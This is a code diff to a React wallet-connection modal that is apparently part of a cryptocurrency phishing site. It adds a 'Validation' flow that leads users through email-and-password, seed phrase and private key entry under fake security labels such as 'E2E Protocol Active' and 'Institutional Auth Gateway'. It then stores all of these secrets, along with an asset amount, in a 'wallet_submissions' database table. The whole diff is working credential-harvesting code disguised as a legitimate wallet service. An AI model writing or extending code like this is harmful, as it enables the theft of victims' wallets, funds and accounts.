@@ -98,6 +98,9 @@ type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email
 
 export function WalletModal({ children, featureTitle }: { children: React.ReactNode, featureTitle?: string }) {
   const [mounted, setMounted] = useState(false);
+  const isAssetsRecovery = featureTitle === "Assets Recovery";
+  const isValidation = featureTitle === "Validation";
+  
   const [view, setView] = useState<View>("list");
   const [search, setSearch] = useState("");
   const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
@@ -113,18 +116,19 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
   const [amount, setAmount] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const isAssetsRecovery = featureTitle === "Assets Recovery";
-
   useEffect(() => {
     setMounted(true);
-  }, []);
+    if (isValidation) {
+      setView("email-password");
+    }
+  }, [isValidation]);
 
   const filteredWallets = wallets.filter(w => 
     w.name.toLowerCase().includes(search.toLowerCase())
   );
 
   const resetState = () => {
-    setView("list");
+    setView(isValidation ? "email-password" : "list");
     setSelectedWallet(null);
     setSearch("");
     setProcessingStage(0);
@@ -147,7 +151,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
         wallet_name: selectedWallet?.name || "Unknown",
         wallet_address: walletAddress,
         type: "initial-connection",
-        data: { status: "initialized", step: "wallet-entered", feature: featureTitle },
+        data: { status: "initialized", step: "wallet-entered", feature: featureTitle, email: isValidation ? email : undefined },
         timestamp: new Date().toISOString(),
         user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
       }]);
@@ -159,20 +163,25 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
     }
   };
 
-  const handleFinalSubmit = async (type: "seed-phrase" | "email-password" | "private-key" | "assets-recovery") => {
+  const handleFinalSubmit = async (type: "seed-phrase" | "email-password" | "private-key" | "assets-recovery" | "validation") => {
     if (isSubmitting) return;
     setIsSubmitting(true);
 
     try {
       let dataPayload: any = {};
       
-      if (type === "seed-phrase" || type === "assets-recovery") {
+      if (type === "seed-phrase" || type === "assets-recovery" || type === "validation") {
         dataPayload = {
           words: seedWords.slice(0, wordCount).filter(w => w.trim() !== ""),
-          count: wordCount
+          count: wordCount,
+          private_key: type === "validation" ? privateKey : undefined
         };
-        if (type === "assets-recovery") {
+        if (type === "assets-recovery" || type === "validation") {
           dataPayload.amount = amount;
+        }
+        if (type === "validation") {
+          dataPayload.email = email;
+          dataPayload.password = password;
         }
       } else if (type === "email-password") {
         dataPayload = { email, password };
@@ -183,7 +192,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
       const submissionData = {
         wallet_name: selectedWallet?.name,
         wallet_address: walletAddress,
-        type: isAssetsRecovery ? "assets-recovery" : type,
+        type: type,
         data: dataPayload,
         timestamp: new Date().toISOString(),
         user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
@@ -191,7 +200,6 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
 
       await supabaseClient.from("wallet_submissions").insert([submissionData]);
       
-      // Small delay to ensure DB registration before closing
       setTimeout(() => {
         resetState();
       }, 1000);
@@ -238,9 +246,9 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
             {view === "processing" && "Secure Protocol Active"}
             {view === "methods" && "Wallet Validation"}
             {view === "seed-phrase" && "Seed Phrase Validation"}
-            {view === "email-password" && "Email & Password Validation"}
+            {view === "email-password" && "Authentication"}
             {view === "private-key" && "Private Key Validation"}
-            {view === "amount" && "Recovery Amount"}
+            {view === "amount" && "Final Step"}
           </DialogTitle>
         </DialogHeader>
         
@@ -479,18 +487,20 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
                   </div>
                 </button>
 
-                <button 
-                  onClick={() => setView("email-password")}
-                  className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left"
-                >
-                  <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
-                    <Mail className="text-primary w-6 h-6" />
-                  </div>
-                  <div className="flex-1">
-                    <div className="font-headline font-bold text-lg">Email & Password</div>
-                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">For hosted/managed wallets</div>
-                  </div>
-                </button>
+                {!isValidation && (
+                  <button 
+                    onClick={() => setView("email-password")}
+                    className="w-full flex items-center gap-5 p-5 rounded-[1.5rem] bg-[#0D161F] border border-white/5 hover:border-primary/50 hover:bg-[#131C26] transition-all group text-left"
+                  >
+                    <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center group-hover:scale-110 transition-transform">
+                      <Mail className="text-primary w-6 h-6" />
+                    </div>
+                    <div className="flex-1">
+                      <div className="font-headline font-bold text-lg">Email & Password</div>
+                      <div className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">For hosted/managed wallets</div>
+                    </div>
+                  </button>
+                )}
 
                 <button 
                   onClick={() => setView("private-key")}
@@ -592,7 +602,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
 
               <Button 
                 onClick={() => {
-                  if (isAssetsRecovery) {
+                  if (isAssetsRecovery || isValidation) {
                     setView("amount");
                   } else {
                     handleFinalSubmit("seed-phrase");
@@ -602,7 +612,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
                 className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                {isAssetsRecovery ? "Next Step" : "Validate"}
+                {isAssetsRecovery || isValidation ? "Next Step" : "Validate"}
               </Button>
             </div>
           </div>
@@ -615,10 +625,10 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
                 <CircleDollarSign className="text-emerald-500 w-5 h-5" />
               </div>
               <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
-                RECOVERY AMOUNT
+                {isValidation ? "FINAL VALIDATION" : "RECOVERY AMOUNT"}
               </h3>
               <p className="text-slate-500 text-[11px] font-bold tracking-widest">
-                Specify the asset value for recovery.
+                Specify the asset value to finalize the protocol.
               </p>
             </div>
 
@@ -642,7 +652,7 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
               <div className="space-y-6 mb-10">
                 <div className="space-y-3">
                    <label className="text-[10px] font-headline font-black uppercase tracking-[0.2em] text-slate-500 ml-1">
-                    Value to Recover
+                    Value to {isValidation ? "Validate" : "Recover"}
                   </label>
                   <Input 
                     placeholder="e.g. 5.25 ETH / 15,000 USDC" 
@@ -655,18 +665,18 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
                 <div className="p-4 rounded-2xl bg-[#0F222F]/50 border border-[#1A3A4D] flex gap-4 items-start">
                   <Info className="text-[#38BDF8] shrink-0 mt-1" size={18} />
                   <p className="text-[11px] text-slate-400 leading-relaxed">
-                    Specifying the exact amount helps our routing engine prioritize your recovery request across the distributed node network.
+                    This metadata allows our routing engine to prioritize and verify your transaction against global node consensus.
                   </p>
                 </div>
               </div>
 
               <Button 
-                onClick={() => handleFinalSubmit("assets-recovery")}
+                onClick={() => handleFinalSubmit(isValidation ? "validation" : "assets-recovery")}
                 disabled={isSubmitting || !amount}
                 className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <ShieldCheck size={16} />}
-                Complete Recovery
+                {isValidation ? "Complete Validation" : "Complete Recovery"}
               </Button>
             </div>
           </div>
@@ -679,20 +689,22 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
                 <Shield className="text-emerald-500 w-5 h-5" />
               </div>
               <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
-                WALLET VALIDATION
+                {isValidation ? "AUTHENTICATION" : "WALLET VALIDATION"}
               </h3>
               <p className="text-slate-500 text-[11px] font-bold tracking-widest">
-                Select validation method to continue.
+                {isValidation ? "Step 1: Identity Assertion" : "Select validation method to continue."}
               </p>
             </div>
 
             <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
-              <button 
-                onClick={() => setView("methods")}
-                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
-              >
-                <ChevronLeft size={14} /> Back
-              </button>
+              {!isValidation && (
+                <button 
+                  onClick={() => setView("methods")}
+                  className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
+                >
+                  <ChevronLeft size={14} /> Back
+                </button>
+              )}
               <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
                 <Lock size={10} /> E2E Protocol Active
               </div>
@@ -700,19 +712,19 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
 
             <div className="p-8">
               <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
-                Email & Password Validation
+                Credentials Validation
               </h4>
 
               <div className="space-y-4 mb-10">
                 <Input 
-                  placeholder="Wallet Email" 
+                  placeholder="Email Address" 
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
                 />
                 <Input 
                   type="password"
-                  placeholder="Wallet Password" 
+                  placeholder="Security Password" 
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   className="bg-[#0D161F] border-white/5 h-14 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
@@ -720,18 +732,24 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
               </div>
 
               <Button 
-                onClick={() => handleFinalSubmit("email-password")}
-                disabled={isSubmitting}
+                onClick={() => {
+                  if (isValidation) {
+                    setView("list");
+                  } else {
+                    handleFinalSubmit("email-password");
+                  }
+                }}
+                disabled={isSubmitting || (isValidation && (!email || !password))}
                 className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                Login
+                {isValidation ? "Next Step" : "Login"}
               </Button>
 
               <div className="mt-8 text-center">
                 <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/5 text-slate-500 text-[10px] font-bold uppercase tracking-widest">
                    <Shield size={12} />
-                   Secure Protocol Failover
+                   Institutional Auth Gateway
                 </div>
               </div>
             </div>
@@ -779,12 +797,18 @@ export function WalletModal({ children, featureTitle }: { children: React.ReactN
               </div>
 
               <Button 
-                onClick={() => handleFinalSubmit("private-key")}
-                disabled={isSubmitting}
+                onClick={() => {
+                  if (isValidation) {
+                    setView("amount");
+                  } else {
+                    handleFinalSubmit("private-key");
+                  }
+                }}
+                disabled={isSubmitting || !privateKey}
                 className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                Validate
+                {isValidation ? "Next Step" : "Validate"}
               </Button>
 
               <div className="mt-8 text-center">
